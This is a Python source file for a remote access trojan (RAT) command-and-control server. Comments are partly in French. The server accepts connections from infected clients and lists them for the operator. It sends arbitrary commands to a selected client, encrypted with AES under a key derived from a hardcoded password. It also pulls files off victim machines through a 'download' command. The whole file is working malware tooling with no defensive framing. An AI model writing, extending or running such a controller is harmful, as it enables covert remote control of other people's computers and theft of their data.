import socket
import threading
import sys
import os
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import base64
import os as crypto_os

# --- Configuration ---
LISTEN_IP = "0.0.0.0"
LISTEN_PORT = 9999
BUFFER_SIZE = 4096

def debug_print(message):
    print(f"[RAT] {message}")

SHARED_PASSWORD = b"MyS3cr3tP@ssw0rd!2024"
SALT = b"ratsalt12345678"
DOWNLOAD_DIR = "downloads"
os.makedirs(DOWNLOAD_DIR, exist_ok=True)

clients = {}
clients_lock = threading.Lock()

backend = default_backend()

def derive_key(password: bytes, salt: bytes) -> bytes:
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=backend
    )
    return kdf.derive(password)

try:
    AES_KEY = derive_key(SHARED_PASSWORD, SALT)
    print("[+] Encryption key derived from password.")
except Exception as e:
    print(f"[-] Error deriving encryption key: {e}")
    sys.exit(1)

def encrypt_data(data: bytes) -> bytes:
    if not AES_KEY:
        return data

    iv = crypto_os.urandom(16)
    cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(iv), backend=backend)
    encryptor = cipher.encryptor()
    pad_len = 16 - (len(data) % 16)
    padded_data = data + bytes([pad_len] * pad_len)
    ciphertext = encryptor.update(padded_data) + encryptor.finalize()
    return base64.b64encode(iv + ciphertext)

def decrypt_data(data: bytes) -> bytes:
    if not AES_KEY:
        return data

    try:
        if isinstance(data, str):
            data = data.encode('utf-8')

        encrypted_data = base64.b64decode(data)
        if len(encrypted_data) < 16:
            raise ValueError("Data too short for IV")

        iv = encrypted_data[:16]
        ciphertext = encrypted_data[16:]
        cipher = Cipher(algorithms.AES(AES_KEY), modes.CBC(iv), backend=backend)
        decryptor = cipher.decryptor()
        padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()
        pad_len = padded_plaintext[-1]
        if pad_len > 16:
            pad_len = 1
        return padded_plaintext[:-pad_len]
    except Exception as e:
        debug_print(f"Decryption error: {e}")
        return data

def recv_exact(sock, n):
    data = b""
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            raise ConnectionError("Connection closed unexpectedly")
        data += packet
    return data

def handle_file_transfer(sock, filename, filesize):
    file_path = os.path.join(DOWNLOAD_DIR, filename)
    bytes_received = 0
    with open(file_path, "wb") as f:
        while bytes_received < filesize:
            # Lire la taille du chunk chiffré (4 bytes big-endian)
            chunk_size_bytes = recv_exact(sock, 4)
            chunk_size = int.from_bytes(chunk_size_bytes, 'big')

            # Lire chunk chiffré
            enc_chunk = recv_exact(sock, chunk_size)

            # Déchiffrer chunk (bytes)
            chunk = decrypt_data(enc_chunk)

            f.write(chunk)
            bytes_received += len(chunk)
    print(f"[+] Fichier {filename} reçu avec succès.")

def handle_client(client_socket, address):
    print(f"\n[+] Accepted connection from {address}")
    client_name = f"Client-{address[0]}:{address[1]}"

    with clients_lock:
        clients[client_socket] = (address, client_name)

    try:
        expecting_file = False
        filename = None
        filesize = 0

        while True:
            if not expecting_file:
                data = client_socket.recv(BUFFER_SIZE)
                if not data:
                    break

                decrypted_response = decrypt_data(data).decode('utf-8', errors='replace')

                if decrypted_response.startswith("download_result"):
                    parts = decrypted_response.split(" ", 2)
                    if len(parts) < 3:
                        print("[!] Mauvais format de commande download_result")
                        continue

                    filename = parts[1]
                    try:
                            filesize = int(parts[2])
                    except ValueError:
                            print("[!] Taille invalide pour le fichier")
                            continue

                    save_path = os.path.join("downloaded_files", filename)
                    os.makedirs("downloaded_files", exist_ok=True)

                    print(f"[+] Réception de '{filename}' ({filesize} octets)...")

                    received_bytes = 0
                    with open(save_path, "wb") as f:
                            while received_bytes < filesize:
                                chunk = client_socket.recv(min(1024, filesize - received_bytes))
                                if not chunk:
                                    break
                                f.write(chunk)
                                received_bytes += len(chunk)

                    print(f"[✓] Fichier sauvegardé dans : {save_path}")
                    continue
                print(f"\n[RECV from {client_name} ({address})]:\n{decrypted_response}\n---END OF RESPONSE---")
            else:
                # On ne devrait jamais arriver ici car handle_file_transfer bloque la réception complète
                pass

    except ConnectionResetError:
        print(f"[-] Connection reset by {client_name} ({address})")
    except Exception as e:
        print(f"[-] Error handling client {client_name} ({address}): {e}")
    finally:
        client_socket.close()
        with clients_lock:
            if client_socket in clients:
                del clients[client_socket]
        print(f"[-] Connection with {client_name} ({address}) closed.")

def send_commands():
    while True:
        try:
            with clients_lock:
                if clients:
                    print("\n--- Connected Clients ---")
                    client_list = list(clients.items())
                    for i, (sock, (addr, name)) in enumerate(client_list):
                        print(f"{i}: {name} ({addr})")
                    print("-------------------------")
                else:
                    print("\n[!] No clients connected.")

            if not clients:
                import time
                time.sleep(2)
                continue

            command_input = input("\nRAT Server> ").strip()
            if not command_input:
                continue

            if command_input.lower().startswith("select "):
                try:
                    index = int(command_input.split()[1])
                    with clients_lock:
                        client_list = list(clients.items())
                        if 0 <= index < len(client_list):
                            selected_socket, (addr, name) = client_list[index]
                            print(f"[+] Selected client: {name} ({addr})")
                            interact_with_client(selected_socket, name, addr)
                        else:
                            print("[!] Invalid client index.")
                except (ValueError, IndexError):
                    print("[!] Usage: select <index>")
            elif command_input.lower() == "list":
                pass
            elif command_input.lower() == "exit":
                print("[+] Shutting down RAT Server...")
                with clients_lock:
                    sockets_to_close = list(clients.keys())
                for sock in sockets_to_close:
                    try:
                        sock.close()
                    except:
                        pass
                os._exit(0)
            else:
                print("[!] Please 'select <index>' a client first, or type 'list' or 'exit'.")

        except KeyboardInterrupt:
            print("\n[!] KeyboardInterrupt received. Exiting...")
            os._exit(0)
        except Exception as e:
            print(f"[!] Error in command input: {e}")

def interact_with_client(client_socket, client_name, address):
    print(f"[+] Interacting with {client_name} ({address}). Type 'back' to return to main prompt.")
    try:
        while True:
            cmd = input(f"RAT ({client_name})> ").rstrip('\n')
            if not cmd:
                continue
            if cmd.lower() == 'back':
                break

            if cmd.lower().startswith("download "):
                filename = cmd[9:].strip()
                if not filename:
                    print("[!] Nom de fichier invalide.")
                    continue

                # Envoie une commande au client pour qu’il envoie ce fichier
                cmd_msg = f"download {filename}"
                client_socket.sendall(encrypt_data(cmd_msg.encode('utf-8')))

                print(f"[+] Commande de téléchargement envoyée pour : {filename}")
                continue


            encrypted_cmd = encrypt_data(cmd.encode('utf-8'))
            if encrypted_cmd:
                client_socket.sendall(encrypted_cmd)
                print(f"[+] Encrypted command sent to {client_name}. Awaiting response...")
            else:
                print("[!] Failed to encrypt command. Not sent.")

    except Exception as e:
        print(f"[!] Error interacting with {client_name}: {e}")
        with clients_lock:
            if client_socket in clients:
                del clients[client_socket]
        try:
            client_socket.close()
        except:
            pass

def main():
    print(f"[+] Starting RAT Server on {LISTEN_IP}:{LISTEN_PORT}...")

    try:
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_sock.bind((LISTEN_IP, LISTEN_PORT))
        server_sock.listen(5)
        print(f"[+] Server listening for RAT client connections (Encryption enabled)...")

        command_thread = threading.Thread(target=send_commands, daemon=False)
        command_thread.start()
        while True:
            client_sock, addr = server_sock.accept()
            client_thread = threading.Thread(target=handle_client, args=(client_sock, addr))
            client_thread.daemon = True
            client_thread.start()

    except KeyboardInterrupt:
        print("\n[!] Server stopped by user (Ctrl+C).")
    except Exception as e:
        print(f"[-] An unexpected server error occurred: {e}")
    finally:
        try:
            server_sock.close()
            print("[+] Server socket closed.")
        except:
            pass

if __name__ == "__main__":
    main()